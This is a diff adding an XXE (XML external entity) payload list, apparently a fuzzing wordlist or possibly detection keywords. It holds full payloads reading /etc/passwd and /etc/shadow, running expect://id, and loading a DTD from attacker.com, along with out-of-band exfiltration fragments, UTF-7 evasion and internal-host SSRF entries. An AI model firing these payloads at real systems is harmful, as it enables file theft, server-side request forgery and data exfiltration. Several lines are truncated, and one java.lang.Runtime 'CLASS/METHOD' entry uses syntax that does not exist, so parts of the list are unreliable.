@@ -1,0 +1,110 @@
+# Basic XXE Payloads
+<!DOCTYPE
+<!ENTITY
+%
+SYSTEM
+"file://
+"http://
+"ftp://
+"php://
+"expect://
+"data://
+ENTITY
+PUBLIC
+]>
+# File Access & SSRF
+file:///etc/passwd
+file:///c:/windows/win.ini
+file:///proc/self/environ
+http://internal.server/
+# Special Protocols
+php://filter/convert.base64-encode/resource=
+expect://id
+data://text/plain;base64,
+jar:
+zip:
+# Out-of-Band (OOB) Exfiltration
+<!ENTITY % ext SYSTEM
+<!ENTITY % int "<!ENTITY % exfil SYSTEM
+# Parameter Entities
+%local;
+%remote;
+<!ENTITY % payload SYSTEM "file:///etc/passwd">
+<!ENTITY % param1 "<!ENTITY % external SYSTEM
+# DTD Inclusion
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY % xxe SYSTEM "file:///etc/passwd" >
+# XInclude Attacks
+<xi:include href="file:///etc/passwd" parse="text"/>
+# Evasion Techniques
+UTF-7: +ADwAIQ-DOCTYPE+ACA-foo+AFs-
+HTML Entities: &lt;!ENTITY &gt;
+CDATA Wrapping: <![CDATA[ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]]>
+# Java-Specific Vectors
+<java:java.io.File>
+<java:java.lang.Runtime>
+# .NET-Specific Vectors
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM
+# XML Schema (XSD)
+<xs:import schemaLocation="http://
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<!ENTITY % xxe SYSTEM "http://attacker.com/malicious.dtd">
+%xxe;
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
+<!ENTITY % remote SYSTEM "http
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http
+%param1;
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "data://text/plain;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">]>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///%2f%65%74%63/%70%61%73%73%77%64">]>
++ADwAIQ-DOCTYPE foo +AFs +ADwAIQ-ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI +AD4 +AC4- +AD4- +ADw-foo+AD4-
+<![CDATA[<!ENTITY xxe SYSTEM "file:///etc/passwd">]]>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal.server:8080">]>
+<!DOCTYPE foo [<!ENTITY xxe CLASS "java.lang.Runtime" METHOD "exec" PARAMS "curl
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "\\
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "C:\Windows\Microsoft.NET\Framework\v4.0.30319\aspnet_isapi.dll">]>
+<!ENTITY % payload "<!ENTITY &#x25; send SYSTEM 'http
+%payload;
+file://
+http://
+https://
+ftp://
+php://
+jar://
+gopher://
+netdoc://
+dict://
+expect://
+zlib://
+compress.zlib://
+data://
+/etc/passwd
+/root/
+boot.ini
+win.ini
+C:\
+/dev/
+/proc/
+/var/
+..\
+..\..\
+external-entity
+parameter-entity
+general-entity
+xxe
+payload
+loadXML
+parse
+resolveEntity
+%20
+%3C
+%3E
+%22
+%25
+&#x
+&#
+base64
+CDATA
